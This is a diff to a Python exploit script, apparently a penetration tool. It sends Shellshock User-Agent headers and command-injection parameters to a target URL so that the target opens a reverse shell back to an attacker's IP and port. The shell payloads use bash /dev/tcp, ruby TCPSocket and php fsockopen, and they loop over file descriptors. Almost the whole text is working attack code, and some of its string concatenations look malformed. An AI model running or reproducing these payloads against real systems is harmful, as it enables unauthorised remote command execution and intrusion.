@@ -94,12 +94,12 @@ def netcat_shellshock():
     os.system("curl -A \"User-Agent: () { :; }; bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1\""+URL)
     os.system("curl -A \"User-Agent: () { :; }; ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\""+URL)
 
-    
     #loop
-    for i in range(3,9):
+    for i in range (0,9):
         i=str(i)
         os.system("curl -A \"User-Agent: () { :; }; php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i+"\");'\""+URL)
         i=int(i)
+
     print"to see if a reverse shell has opened listen with netcat"
 
 #define typical_command_injection   
@@ -145,10 +145,11 @@ def netcat_command_injection():
         requests.post(URL, data={parameter:";ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"})
         
         #loop
-        for i in range (3,9):
+        for i in range(0, 9):
             i=str(i)
             requests.post(URL, data={parameter:";php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i})
             i=int(i)
+
             
     #exploit for get
     if reqtype == "get":
@@ -157,11 +158,11 @@ def netcat_command_injection():
         requests.get(URL+"?"+parameter+"=;ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
         
         #loop
-        while i < 9:
+        for i in range(0, 9):
             i=str(i)
             requests.get(URL+"?"+parameter+"=;php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i)
             i=int(i)
-            i+=1
+
             
     #display message
     print "to see if a reverse shell has opened listen with netcat!"
